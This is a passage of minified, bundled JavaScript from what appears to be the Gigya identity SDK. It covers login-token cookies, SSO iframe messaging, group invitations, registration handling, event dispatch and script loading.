                window.gigya.utils.queue.release("verifyLogin", "API"), a.sessionData.setIsSessionVerified(f(), 0 == i.errorCode);
                var r = i.source;
                window.gigya.events.global.dispatchWhenHandlerAdded({
                  eventName: "socialize.login"
                }, null, function (t, n) {
                  t || (t = {}), t = window.gigya.utils.object.merge([t, e]), 0 == i.errorCode ? window.gigya.socialize.getUserInfo({
                    signIDs: !0,
                    extraFields: "samlData",
                    callback: function (e) {
                      0 == e.errorCode ? ((t = window.gigya._.addUserInfoToEvent(e, {
                        eventName: "login"
                      }, !0)).source = r, t.newUser = !1, t.provider = "site", t.loginMode = "standard", t.user && (t.user.errorCode = e.errorCode, t.user.callId = e.callId), i.id_token && (t.id_token = i.id_token)) : t.cancel = !0, n(t);
                    }
                  }) : (t.cancel = !0, n(t));
                }), window.gigya.events.global.dispatchWhenHandlerAdded({
                  eventName: "accounts.login"
                }, null, function (n, r) {
                  return o.__awaiter(t, void 0, void 0, function () {
                    return o.__generator(this, function (t) {
                      switch (t.label) {
                        case 0:
                          return n || (n = {}), n = window.gigya.utils.object.merge([n, e]), 0 != i.errorCode ? [3, 3] : (n.eventName = "accounts.login", i.UID ? [3, 2] : [4, new gigya.Promise(function (e) {
                            return window.gigya.accounts.getAccountInfo({
                              callback: e,
                              include: window.gigya.utils.stringUtils.mergeCommaSeparatedValues("profile,data", window.gigya.thisScript.globalConf.include)
                            });
                          })]);
                        case 1:
                          i = t.sent(), t.label = 2;
                        case 2:
                          return window.gigya.utils.object.extractProperties(i, n, "signature|UIDSig|timestamp|UIDSignature|signatureTimestamp|UID|profile|data|dataCenter|id_token|groups"), [3, 4];
                        case 3:
                          n.cancel = !0, t.label = 4;
                        case 4:
                          return r(n), [2];
                      }
                    });
                  });
                }), n();
              }
            });
          })];
        });
      });
    }
    function w(e) {
      return void 0 === e && (e = window.gigya.thisScript.APIKey), o.__awaiter(this, void 0, void 0, function () {
        return o.__generator(this, function (t) {
          switch (t.label) {
            case 0:
              return f(e) && window.gigya.logger.info("removing login token"), window.gigya.utils.cookie.remove("glt_" + e), window.gigya.utils.cookie.remove("_gig_lt"), window.gigya.utils.cookie.remove("gltexp_" + e), window.gigya.partnerSettings.ssoKey ? (window.gigya.logger.info("removing group login token"), [4, r.SsoService.getInstance()]) : [3, 2];
            case 1:
              return [2, t.sent().removeToken()];
            case 2:
              return [2, gigya.Promise.resolve()];
          }
        });
      });
    }
    function m() {
      var e = window.gigya.utils.cookie.getDefaultDomain();
      return window.gigya.utils.stringUtils.endsWith(e, window.gigya.defaultApiDomain);
    }
    t.activeNamespaces = {}, t.isValidGltExp = function (e) {
      return void 0 === e && (e = l()), !e || window.gigya.utils.gltexp.isValid(e);
    }, t.getGltexpCookie = l, t.setGltexp = function (e, t) {
      void 0 === t && (t = window.gigya.thisScript.APIKey), e && !m() && (window.gigya.utils.cookie.remove(d(t)), s.FlagService.setCookieSameSiteLaxSession ? window.gigya.utils.cookie.set(d(t), e, null, null, null, "Lax") : window.gigya.utils.cookie.set(d(t), e));
    }, t.get = f, t.set = p, t.getCurrentSessionExpiration = function () {
      return i;
    }, t.getGACCookie = h, t.setFromAuthCode = function (e) {
      return o.__awaiter(this, void 0, void 0, function () {
        return o.__generator(this, function (t) {
          return [2, new gigya.Promise(function (t) {
            v({}, t, e);
          })];
        });
      });
    }, t.setFromGAC = v, t.setFromSsoResponse = function (e, t) {
      return void 0 === t && (t = window.gigya.thisScript.APIKey), o.__awaiter(this, void 0, void 0, function () {
        var n = this;
        return o.__generator(this, function (i) {
          return [2, new gigya.Promise(function (i) {
            return o.__awaiter(n, void 0, void 0, function () {
              var n, r, a;
              return o.__generator(this, function (o) {
                switch (o.label) {
                  case 0:
                    if (!e) return [2];
                    switch (e.errorCode) {
                      case 403005:
                        return [3, 1];
                      case 403025:
                        return [3, 2];
                      case 403032:
                      case 0:
                        return [3, 3];
                      case 500026:
                        return [3, 5];
                    }
                    return [3, 6];
                  case 1:
                    return window.gigya.logger.info("no group session found"), w(t), [3, 7];
                  case 2:
                    return window.gigya.logger.info("existing group session was revoked"), w(t), window.gigya.events.global.dispatchWhenHandlerAdded({
                      eventName: "accounts.logout"
                    }), window.gigya.events.global.dispatchWhenHandlerAdded({
                      eventName: "logout"
                    }), [3, 7];
                  case 3:
                    return e.login_token ? (window.gigya.logger.info("new session from group"), n = void 0, r = void 0, e.groupContext && (r = JSON.parse(e.groupContext)), m() || (n = e.gltexp ? window.gigya.utils.cookie.getInfiniteExpirationTimeInSeconds() : e.expires_in, p(t, e.login_token, n), a = "gltexp_" + t, e.gltexp && !window.gigya.utils.cookie.get(a) && window.gigya.utils.cookie.set(a, e.gltexp)), [4, y({
                      expires_in: n,
                      groupContext: r
                    })]) : [2];
                  case 4:
                    return o.sent(), [3, 7];
                  case 5:
                    return window.gigya.logger.error("gigya: error loading sso frame", {
                      res: e
                    }), window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], e), [3, 7];
                  case 6:
                    throw window.gigya.logger.error("sso: unsupported response"), "gigya: unsupported response from sso";
                  case 7:
                    return i(), [2];
                }
              });
            });
          })];
        });
      });
    }, t.dispatchLoginEvent = y, t.remove = w, t.getTokenParam = function (e, t) {
      var n = window.gigya.utils.cookie.get(g(e));
      if (n) {
        var i = n.split("|");
        return i.length > 1 ? window.gigya.utils.keyValue.deserialize(i[1])[t] : null;
      }
    }, t.setBearerToken = function (e) {
      window.gigya.logger.info("setting a new Bearer token"), c = "Bearer " + e;
    }, t.getBearerToken = function () {
      return c;
    }, t.removeBearerToken = function () {
      window.gigya.logger.info("Bearer token removed"), c = null;
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.getParentUrl = function (e, t) {
      return void 0 === e && (e = window), void 0 === t && (t = document), e.location != e.parent.location ? t.referrer : t.location.href;
    }, t.getBodyElement = function (e) {
      return void 0 === e && (e = document), new gigya.Promise(function (t) {
        e.body ? t(e.body) : e.addEventListener("DOMContentLoaded", function () {
          return t(e.body);
        });
      });
    }, t.validateOrigin = function (e, t) {
      var n;
      return 0 === (null === (n = null == e ? void 0 : e.toLowerCase()) || void 0 === n ? void 0 : n.indexOf(null == t ? void 0 : t.toLowerCase()));
    }, t.createIframe = function (e, t) {
      void 0 === e && (e = "Gigya Frame"), void 0 === t && (t = document);
      var n = t.createElement("iframe");
      return n.style.position = "absolute", n.style.height = "0px", n.style.width = "0px", n.style.display = "none", n.title = e, n.setAttribute("aria-hidden", "true"), n;
    };
    var n = 1;
    t.generateId = function () {
      return String(n++);
    }, t.getAllClassMethodsNames = function (e) {
      var t = [],
        n = function (e) {
          return !!e.prototype;
        }(e) ? e.prototype : e;
      do {
        try {
          var i = Object.getOwnPropertyNames(n).map(function (e) {
            return e.toString();
          }).sort().filter(function (e, i, o) {
            return "function" == typeof n[e] && "constructor" !== e && (0 == i || e !== o[i - 1]) && -1 === t.indexOf(e);
          });
          t = t.concat(i);
        } catch (e) {
          for (var o = Object.getOwnPropertyNames(n).map(function (e) {
              return e.toString();
            }).sort(), r = (i = [], 0); r < o.length; r++) {
            var a = o[r];
            "function" != typeof n[a] || "constructor" === a || 0 != r && a === o[r - 1] || -1 !== t.indexOf(a) || i.push(a);
          }
          t = t.concat(i);
        }
      } while ((n = Object.getPrototypeOf(n)) && Object.getPrototypeOf(n));
      return t;
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    }), t.isExplicitTrue = function (e) {
      var t = ("" + e).toLowerCase();
      return "true" == t || "1" == t;
    }, t.isExplicitFalse = function (e) {
      var t = ("" + e).toLowerCase();
      return "false" == t || "0" == t;
    }, t.isLaterThanNow = function (e) {
      return e > new Date().getTime();
    }, t.allDefinedOrAllUndefined = function () {
      for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
      var n = e.some(function (e) {
          return void 0 === e;
        }),
        i = e.some(function (e) {
          return void 0 !== e;
        });
      return i && !n || !i && n;
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(3),
      r = n(24),
      a = n(14),
      s = n(5),
      c = n(4),
      u = n(10);
    function l(e) {
      return i.__awaiter(this, void 0, void 0, function () {
        return i.__generator(this, function (t) {
          return [2, new gigya.Promise(function (t) {
            window.gigya.accounts.groups.invitationConfirm({
              ignoreApiQueue: !0,
              invitationId: e,
              callback: t
            });
          })];
        });
      });
    }
    function d(e) {
      return i.__awaiter(this, void 0, void 0, function () {
        return i.__generator(this, function (t) {
          return [2, new gigya.Promise(function (t) {
            window.gigya.accounts.groups.finalizeInvitation({
              ignoreApiQueue: !0,
              token: e,
              callback: function (e) {
                0 !== e.errorCode ? window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], e) : window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.finalizeGroupInvitation", "socialize.finalizeGroupInvitation"], e), t();
              }
            });
          })];
        });
      });
    }
    function g(e) {
      if (null != e.identities) {
        if (e.identities.constructor == Array) {
          var t = e.identities;
          e.identities = {};
          for (var n = 0; n < t.length; n++) e.identities[t[n].provider] = new window.gigya.socialize.Identity(t[n]);
        }
      } else e.identities = {};
    }
    !function (e) {
      e[e.LocalStorageListener = 0] = "LocalStorageListener", e[e.PostMessage = 1] = "PostMessage", e[e.Flash = 2] = "Flash";
    }(t.MessagingMethod || (t.MessagingMethod = {})), t.checkCompleteRegistration = function (e, t, n, i) {
      var r,
        a,
        s,
        c = !1;
      if (206005 == e.errorCode) window.gigya.logger.info("finalizing registration after email verification"), c = !0, window.gigya.accounts.finalizeRegistration({
        regToken: e.regToken,
        ignoreApiQueue: !0,
        callback: i
      });else if (!t.ignoreInterruptions && !t.dontHandleScreenSet && ((e.regToken || t.regToken) && (200010 == e.errorCode || 409003 == e.errorCode || 403043 == e.errorCode) || 206001 == e.errorCode || 206002 == e.errorCode || 206003 == e.errorCode || 403101 == e.errorCode || 403102 == e.errorCode || 403110 == e.errorCode || 403100 == e.errorCode || 206006 == e.errorCode)) {
        var u;
        409003 == e.errorCode && (s = {
          access_token: e.access_token,
          provider: e.provider,
          provider_uid: e.provider_uid,
          idToken: e.id_token,
          code: e.code,
          lastName: e.lastName,
          firstName: e.firstName
        }), 403110 == e.errorCode && (a = !0, u = !0), t.defaultMobileRegScreenSet && o.localInfo.isMobile ? r = t.defaultMobileRegScreenSet : t.defaultRegScreenSet && (r = t.defaultRegScreenSet);
      }
      r ? (window.gigya.logger.info("showing screenset '" + r + "' for errorCode " + e.errorCode), window.gigya.logger.group(r), window.gigya.accounts.showScreenSet({
        ignoreApiQueue: !0,
        newModal: u,
        screenSet: r,
        initialMethod: n,
        initialResponse: e,
        suppressLoginEvent: t.suppressLoginEvent,
        providerSessionInfo: s,
        onError: function (t) {
          i(e);
        },
        onHide: function (t) {
          if (window.gigya.logger.groupEnd(r), "finished" === t.reason && t.user) {
            var n = {
              errorCode: 0,
              userInfo: t.user,
              source: t.source
            };
            i(n, !0, a);
          } else i(e);
        }
      })) : c || i(e);
    }, t.checkGroupInvitation = function (e) {
      return i.__awaiter(this, void 0, void 0, function () {
        var t, n;
        return i.__generator(this, function (a) {
          switch (a.label) {
            case 0:
              return e.invitationId || window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], {
                status: "MISSING_REQUIRED_PARAMETER",
                statusMessage: "Missing required parameter: invitationId",
                errorCode: 400002,
                errorMessage: "Missing required parameter: invitationId"
              }), [4, l(e.invitationId)];
            case 1:
              return (t = a.sent()).token ? [3, 2] : (window.gigya.events.global.dispatchWhenHandlersAdded(["accounts.error", "socialize.error"], t), [3, 5]);
            case 2:
              return null !== r.get() ? [3, 3] : (window.gigya.accounts.addEventHandlers({
                onLogin: function () {
                  return i.__awaiter(this, void 0, void 0, function () {
                    return i.__generator(this, function (e) {
                      switch (e.label) {
                        case 0:
                          return [4, d(t.token)];
                        case 1:
                          return e.sent(), [2];
                      }
                    });
                  });
                }
              }), n = o.localInfo.isMobile ? window.gigya.thisScript.globalConf.defaultMobileRegScreenSet : window.gigya.thisScript.globalConf.defaultRegScreenSet, window.gigya.accounts.showScreenSet({
                ignoreApiQueue: !0,
                screenSet: n
              }), [3, 5]);
            case 3:
              return [4, d(t.token)];
            case 4:
              a.sent(), a.label = 5;
            case 5:
              return [2];
          }
        });
      });
    }, t.getGigyaSettings = function (e) {
      var t = a.getObject("gigyaSettings");
      return s.serialize(t[e]);
    }, t.setGigyaSettings = function (e, t) {
      var n,
        i = a.getObject("gigyaSettings", ((n = {})[e] = {}, n));
      for (var o in t) i[e][o] = t[o];
      a.setItem("gigyaSettings", s.serialize(i));
    }, t.delGigyaSettings = function (e) {
      if (e) {
        var t = a.getObject("gigyaSettings");
        t && (delete t[e], a.setItem("gigyaSettings", s.serialize(t)));
      } else a.removeItem("gigyaSettings");
    }, t.handleSpecialFields = function (e) {
      var t = window.gigya.socialize.Collection,
        n = function (e, t) {
          for (var n = [], i = 0, o = e[i]; o;) n.push(new t(o)), n[i].identities && g(n[i]), o = e[++i];
          return n;
        };
      if (e.photos && (e.photos = new t(e.photos, "photoID")), e.albums && (e.albums = new t(e.albums, "albumID")), e.contacts && (e.contacts = new t(n(e.contacts, window.gigya.socialize.Contact), "email")), e.friend && (e.friend = new t(n(e.friend, window.gigya.socialize.Friend), "UID")), e.user && (e.user = new window.gigya.socialize.User(e.user)), e.friends && e.friends instanceof Array) {
        for (var i = [], o = 0; o < e.friends.length; o++) i.push(e.friends[o].UID);
        e.UIDs = i.join(","), e.friends = new t(n(e.friends, window.gigya.socialize.Friend), "UID");
      }
    }, t.convertIdentitiesArrayToObject = g, t.addUserInfoToEvent = function (e, t, n, i) {
      var o = e.user || e.userInfo;
      return null == t && (t = {}), null != o && (t.user = c.clone(o), null != e.isLoggedIn && (t.user.isLoggedIn = e.isLoggedIn), null != e.isSiteUID && (t.user.isSiteUID = e.isSiteUID), null != e.iRank && (t.user.iRank = e.iRank)), n && (c.extractProperties(e, t, "signature|UIDSig|timestamp|UIDSignature|signatureTimestamp|UID|signKeysUIDSignature|dataCenter|id_token|groups"), null != t.user && (t.UID = o.UID, t.isSiteUID = o.isSiteUID)), t;
    }, t.sendEmailNative = function (e) {
      var t = e.userAction || {},
        n = t.title || "",
        i = t.linkBack || "";
      document.location.href = "mailto:?to=&subject=" + u.URLEncode(n) + "&body=" + u.URLEncode(i), window.gigya.socialize.sendEmail(e, {
        dontSendEmail: !0
      });
    };
  }, function (e, t) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function () {
      function e(e) {
        void 0 === e && (e = window), this._win = e;
      }
      return e.prototype.setCookie = function (e, t, n) {
        var i = e + "=" + escape(t);
        n.path && (i += "; path=" + n.path), n.expires && (i += "; expires=" + n.expires.toUTCString()), n.domain && -1 != n.domain.indexOf(".") && (i += "; domain=" + n.domain), n.sameSite && (i += "; sameSite=" + n.sameSite), n.secure && (i += "; secure"), this._win.document.cookie = i;
      }, e.prototype.getCookie = function (e) {
        e = e.replace(/([.*+?^=!:${}()|[\]\/\\])/g, "\\$1").replace(/^[ \t]+|[ \t]+$/g, "");
        var t = new RegExp("(?:^|;)\\s?" + e + "=(.*?)(?:;|$)"),
          n = this._win.document.cookie.match(t);
        return n && unescape(n[1]);
      }, e;
    }();
    t.CookieStore = n;
  },, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(4),
      o = function () {
        function e() {}
        return e.prototype.has = function (e) {
          return void 0 !== this._toggles[e];
        }, e.prototype.get = function (e) {
          return this._toggles[e];
        }, e.prototype.isOn = function (e) {
          return this.has(e) && this.get(e);
        }, Object.defineProperty(e.prototype, "_toggles", {
          get: function () {
            return i.merge([this._globalConfToggles, this._webSdkConfigToggles]);
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "_globalConfToggles", {
          get: function () {
            var e, t;
            return (null === (t = null === (e = window.gigya.thisScript) || void 0 === e ? void 0 : e.globalConf) || void 0 === t ? void 0 : t.toggles) || {};
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(e.prototype, "_webSdkConfigToggles", {
          get: function () {
            var e,
              t,
              n = (null === (t = null === (e = window.gigya._) || void 0 === e ? void 0 : e.config) || void 0 === t ? void 0 : t.toggles) || {};
            return Object.keys(n).reduce(function (e, t) {
              return e[t] = "on" === n[t], e;
            }, {});
          },
          enumerable: !0,
          configurable: !0
        }), e;
      }();
    t.default = new o();
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(46),
      r = n(22),
      a = n(25),
      s = n(2),
      c = n(48),
      u = 0;
    t._requestTimeout = 3e3;
    var l = function () {
      function e() {}
      return e.getInstance = function (t) {
        return void 0 === t && (t = window.gigya.partnerSettings.ssoKey), i.__awaiter(this, void 0, void 0, function () {
          var n, a, u, l;
          return i.__generator(this, function (i) {
            switch (i.label) {
              case 0:
                return this._instance ? [3, 7] : t ? [3, 1] : [2, null];
              case 1:
                if (!s.FlagService.loadSsoFrameOnlyOnce) return [3, 6];
                n = window.gigya.utils.keyValue.serialize({
                  APIKey: t,
                  version: window.gigya.build.version,
                  build: window.gigya.build.number || -1,
                  sourceKey: window.gigya.thisScript.APIKey,
                  oneFrame: !0,
                  origin: window.gigya.localInfo.protocol + "://" + document.location.hostname,
                  ssoSegment: window.gigya.partnerSettings.ssoSegment || ""
                }), a = "https://" + r.getStorageDomain() + "/gs/sso.htm?" + n, i.label = 2;
              case 2:
                return i.trys.push([2, 4,, 5]), [4, (u = new c.ServiceProxy(a)).init("SSO")];
              case 3:
                return i.sent(), this._instance = u.wrapWith(o.Sso), [3, 5];
              case 4:
                return l = i.sent(), window.gigya.logger.error("error initialize sso frame", {
                  scope: "SsoService.init",
                  error: l
                }), this._instance = new e(), [3, 5];
              case 5:
                return [3, 7];
              case 6:
                this._instance = new e(), i.label = 7;
              case 7:
                return [2, this._instance];
            }
          });
        });
      }, e.prototype.checkTokenRenew = function (e) {
        return new gigya.Promise(function (t) {
          w({
            loginToken: e,
            callback: t
          });
        });
      }, e.prototype.getToken = function () {
        return new gigya.Promise(function (e) {
          g({
            callback: e
          });
        });
      }, e.prototype.getTokenExpiration = function () {
        return new gigya.Promise(function (e) {
          y({
            callback: e
          });
        });
      }, e.prototype.logout = function () {
        return new gigya.Promise(function (e) {
          p({
            callback: e
          });
        });
      }, e.prototype.removeToken = function () {
        return new gigya.Promise(function (e) {
          h({
            callback: e
          });
        });
      }, e.prototype.setGroupContext = function (e) {
        return new gigya.Promise(function (t) {
          _({
            groupContext: e,
            callback: t
          });
        });
      }, e.prototype.setToken = function (e, t, n) {
        return new gigya.Promise(function (i) {
          f({
            lt: e,
            expiration: t,
            gltexp: n,
            callback: i
          });
        });
      }, e.prototype.setTokenExpiration = function (e, t) {
        return void 0 === t && (t = !0), new gigya.Promise(function (n) {
          v({
            loginTokenExp: e,
            callback: n
          }, t);
        });
      }, e.prototype.syncCanaryIndication = function (e, t) {
        return new gigya.Promise(function (n) {
          m({
            isCanary: e,
            canaryVersion: t,
            callback: n
          });
        });
      }, e.prototype.getGroupApiDomain = function () {
        return new gigya.Promise(function (e) {
          S({
            callback: e
          });
        });
      }, e.prototype.setGroupApiDomain = function (e) {
        return new gigya.Promise(function (t) {
          b({
            callback: t,
            domain: e
          });
        });
      }, e;
    }();
    function d(e, n) {
      if (window.gigya.partnerSettings.ssoKey) {
        var i, o, c;
        i = n ? window.gigya.utils.object.clone(n) : {};
        var l = function (e) {
          window.gigya.logger.debug("cleaning sso iframe"), o.parentNode.removeChild(o), clearTimeout(c), e && (e.errorCode && "string" == typeof e.errorCode && (e.errorCode = Number(e.errorCode)), e.expires_in && "string" == typeof e.expires_in && (e.expires_in = Number(e.expires_in))), n && n.callback && n.callback(e);
        };
        i.m = e, i.d = window.gigya.localInfo.protocol + "://" + document.location.hostname, document.location.port && (i.d += ":" + document.location.port), i.callbackID = "gig_sso_cb" + new Date().getTime() + "_" + u++, i.sAPIKey = window.gigya.thisScript.APIKey, i[window.gigya.logger.configKey] = JSON.stringify(window.gigya.logger.getConfig());
        var d = window.gigya.utils.keyValue.serialize(i),
          g = function (n) {
            void 0 === n && (n = 0), window.gigya.utils.xd.addMessageListener(i.callbackID, {}, !1, l, window.gigya._.MessagingMethod.PostMessage), o = function (e) {
              var t;
              s.FlagService.hideSSOFrame ? t = a.createIframe("SSO Frame") : (t = document.createElement("iframe"), window.gigya.localInfo.isIOS || window.gigya.localInfo.isIOSChrome || window.gigya.localInfo.isAndroid ? (t.style.width = "0px", t.style.height = "0px", t.style.display = "none") : (t.style.width = "30px", t.style.height = "10px", t.style.position = "absolute", t.style.top = "-1000px", t.style.left = "-1000px"));
              return t.id = "gig_sso_" + e, window.gigya.utils.functions.addSrcToIFrameIfNeeded(t), t;
            }(i.callbackID);
            var u = function () {
              c = setTimeout(function () {
                n <= 0 ? window.gigya.logger.error("SSO Communication Timeout", {
                  IE11PrivateMode: window.gigya.localInfo.isIE11 && !window.indexedDB,
                  mode: e
                }) : (window.gigya.utils.xd.removeMessageListener(i.callbackID), window.gigya.utils.DOM.removeElement(o), g(n - 1));
              }, t._requestTimeout);
              var a = window.gigya.utils.keyValue.serialize({
                APIKey: window.gigya.partnerSettings.ssoKey,
                ssoSegment: window.gigya.partnerSettings.ssoSegment || "",
                version: window.gigya.build.version,
                build: window.gigya.build.number || -1
              });
              o.src = "https://" + r.getStorageDomain() + "/gs/sso.htm?" + a + "#" + d, window.gigya.utils.DOM.removeEventListener(o, "load", u);
            };
            window.gigya.utils.DOM.addEventListener(o, "load", u), window.gigya.logger.debug("opening sso iframe", i), document.body ? window.gigya.utils.DOM.appendToBody(o) : window.gigya.utils.functions.invokeOnPageLoad(function () {
              return window.gigya.utils.DOM.appendToBody(o);
            });
          };
        g(3);
      } else n && n.callback && n.callback({});
    }
    function g(e) {
      window.gigya.logger.info("trying to get sso group login token"), d("getToken", {
        callback: function (n) {
          t._storedLoginTokenExp = n.gltexp, e && e.callback && e.callback(n);
        }
      });
    }
    function f(e) {
      e.gltexp || (e.gltexp = window.gigya.utils.cookie.get("gltexp_" + window.gigya.thisScript.APIKey)), d("setToken", e);
    }
    function p(e) {
      d("logout", e);
    }
    function h(e) {
      d("removeToken", e);
    }
    function v(e, n) {
      void 0 === n && (n = !0), n && t._storedLoginTokenExp && e.loginTokenExp === t._storedLoginTokenExp ? e.callback && e.callback({
        gltexp: t._storedLoginTokenExp
      }) : (t._storedLoginTokenExp = e.loginTokenExp, d("setLoginTokenExp", e));
    }
    function y(e) {
      d("getLoginTokenExp", e);
    }
    function w(e) {
      window.gigya.logger.info("verifying login token with sso group"), d("checkTokenRenew", e);
    }
    function m(e) {
      d("syncCanaryIndication", e);
    }
    function _(e) {
      d("setGroupContext", e);
    }
    function b(e) {
      d("setGroupApiDomain", e);
    }
    function S(e) {
      d("getGroupApiDomain", e);
    }
    t.SsoService = l, t._request = d, t.getGroupToken = g, t.setGroupToken = f, t.logout = p, t.removeGroupToken = h, t.setLoginTokenExp = v, t.getLoginTokenExp = y, t.checkTokenRenew = w, t.syncCanaryIndication = m, t.setGroupContextCookie = _, t.setGroupApiDomain = b, t.getGroupApiDomain = S;
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0),
      o = n(18),
      r = n(45),
      a = n(4),
      s = n(27),
      c = n(59);
    function u(e) {
      return "on" === e.substring(0, 2) ? e : "on" + e.substring(0, 1).toUpperCase() + e.substring(1);
    }
    var l = {},
      d = {};
    function g(e, t) {
      var n = 0,
        i = e.isInternal,
        o = e.eventName.split(",");
      r.addLog('Dispatching global event "' + e.eventName + '" with this event object', e);
      for (var d = 0; d < o.length; d++) {
        var g = o[d].split("."),
          f = g.length > 1 ? g.shift() : "socialize",
          p = g[0],
          h = f + "_" + u(p),
          v = a.clone(l[h]) || [],
          y = a.clone(e);
        y.isGlobal = !0, y.eventName = p, y.fullEventName = o[d], t && (t.source && (y.source = t.source), t.sourceData && (y.sourceData = t.sourceData), t.context && (y.context = t.context));
        var w = ["component"];
        i || w.push("other");
        for (var m = 0; m < w.length; m++) for (var _ = w[m], b = 0; b < v.length; b++) {
          var S = v[b];
          if (S.type == _) {
            var P = a.clone(y);
            !P.context && S.context && (P.context = S.context), P.context || delete P.context, "component" !== _ && (n++, s.handleSpecialFields(P)), S.params && S.params.signKey && (P.UIDSignature = e.signKeysUIDSignature[S.params.signKey], delete P.signKeysUIDSignature);
            try {
              S.handler(P);
            } catch (t) {
              r.addLog('Error while trying to invoke "' + e.eventName + '" global event handler', t);
            }
          }
        }
        i || c._dispatchFromMaps(y, !0);
        var A = window.GenesisExchange_Gigya,
          I = window.gigya_omniture_conf,
          k = window.myOmnitureIntegrationFunc;
        if (!i && void 0 !== A && void 0 !== I && "socialize" == f) new A(I).processAction(y), void 0 !== k && k(I, y);
      }
      return n;
    }
    function f(e, t, n) {
      void 0 === t && (t = {});
      var i = e.eventName.split("."),
        o = i.length > 1 ? i.shift() : "socialize",
        r = i[0];
      p(e, t, n, function (i) {
        if (0 == i) {
          var a = "on" + r.substring(0, 1).toUpperCase() + r.substring(1),
            s = o + "_" + a;
          d[s] || (d[s] = []), d[s].push({
            eventObj: e,
            params: t,
            preProcess: n
          });
        }
      });
    }
    function p(e, t, n, i) {
      var o = function (e) {
        var n = 0;
        e.cancel || (n = g(e, t)), i && i(n);
      };
      n ? n(e, o) : o(e);
    }
    t._activeNamespaces = {}, t.add = function (e, t, n, i, o, r) {
      void 0 === n && (n = "other"), void 0 === o && (o = "socialize");
      var a = o + "_" + u(e);
      l[a] || (l[a] = []);
      var s = {
        handler: t,
        type: n,
        context: i,
        params: r,
        fullEventName: a
      };
      l[a].push(s), !this._activeNamespaces[o] && window.gigya._.apiAdapter && window.gigya._.apiAdapter.registerForNamespaceEvents(o), this._activeNamespaces[o] = 1;
      var c = d[a];
      if (c && "other" == n) {
        d[a] = [];
        for (var g = 0; g < c.length; g++) {
          var f = c[g];
          p(f.eventObj, f.params, f.preProcess);
        }
      }
      return s;
    }, t.remove = function (e, t) {
      l[e] && o.removeByValue(l[e], t);
    }, t.dispatch = g, t.dispatchWhenHandlerAdded = f, t.dispatchWhenHandlersAdded = function (e, t, n, o) {
      void 0 === n && (n = {});
      for (var r = 0, a = e; r < a.length; r++) {
        var s = a[r];
        f(i.__assign({
          eventName: s
        }, t), n, o);
      }
    }, t.getEventsForOperation = function (e) {
      var t = [];
      return -1 != e.toLowerCase().indexOf("login") ? (this._activeNamespaces.socialize && t.push("socialize.login"), this._activeNamespaces.accounts && t.push("accounts.login")) : -1 != e.toLowerCase().indexOf("addconnection") && this._activeNamespaces.socialize && t.push("socialize.connectionAdded"), t.join(",");
    };
  }, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = n(0);
    t.promisify = function (e, t) {
      return void 0 === t && (t = {}), new gigya.Promise(function (n) {
        e(i.__assign(i.__assign({}, t), {
          callback: function (e) {
            n(e);
          }
        }));
      });
    };
  },, function (e, t, n) {
    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i,
      o = n(6),
      r = n(3),
      a = n(18),
      s = n(9),
      c = n(13),
      u = n(21),
      l = {};
    function d(e) {
      return e.replace(/^http(s?):\/\/cdn(s?)[0-9]*.gigya.com\//, "http$1://cdn$2.gigya.com/");
    }
    function g(e, t, n, i, c, u) {
      var g;
      if (void 0 === c && (c = 5e3), 0 === e.indexOf("//") && (e = r.localInfo.protocol + ":" + e), i) {
        var f = d(e);
        if (l[f]) return void (l[f].loaded ? (window.gigya.logger.debug("script was already loaded:", {
          src: e
        }), n && n()) : (l[f].onLoad.push(n), l[f].onError.push(t)));
        g = l[f] = {
          loaded: !1,
          onLoad: [n],
          onError: [t]
        }, u && u.length > 0 && a.forEach(u, function (e) {
          l[e] = g;
        });
      } else g = {
        loaded: !1,
        onLoad: [n],
        onError: [t]
      };
      var p = function () {
        var t = document.createElement("script");
        t.async = !0, t.type = "text/javascript", t.charset = "UTF-8";
        var n = !1,
          i = function () {
            if (!n) {
              if (g.onLoad && g.onLoad.length) for (var e = 0; e < g.onLoad.length; e++) "function" == typeof g.onLoad[e] && g.onLoad[e]();
              g.loaded = !0, g.onError = g.onLoad = null, n = !0, !0 === c && (c = 0), !1 !== c && setTimeout(function () {
                t.parentNode && t.parentNode.removeChild(t);
              }, c);
            }
          };
        t.onload = i, t.onreadystatechange = function () {
          "loaded" === this.readyState && i();
        }, t.onerror = function () {
          for (var t = 0; t < g.onError.length; t++) "function" == typeof g.onError[t] && g.onError[t]();
          delete l[e];
        };
        var a = document.getElementsByTagName("head");
        a && a.length > 0 && a[0].appendChild(t);
        var s = function () {
          var n,
            i,
            r = new RegExp("^https?://cdns?.*" + window.gigya.defaultApiDomain + "/.*gigya.js").test(e) ? (n = e, (i = o.Uri.parse(n)).addToSearch({
              version: window.gigya.build.version
            }), i.toString()) : e;
          t.src = r;
        };
        r.localInfo.iosVersion >= 6 ? s() : setTimeout(s, 1);
      };
      r.localInfo.isIE ? s.invokeOnPageLoad(p) : p();
    }
    t.isLoaded = function (e) {
      var t = d(e);
      return Boolean(l[t] && l[t].loaded);
    }, t.load = g, function (e) {
      e[e.script = 0] = "script", e[e.image = 1] = "image", e[e.iframe = 2] = "iframe";
    }(i = t.ResourceTypes || (t.ResourceTypes = {})), t.triggerResource = function (e, t, n, o) {
      switch (void 0 === n && (n = i.image), void 0 === o && (o = 5e3), n) {
        case i.script:
          g(e, t, t, !1, o);
          break;
        case i.image:
          !function (e, t) {
            var n = new Image(),
              i = !1;
            n.onload = n.onerror = function () {
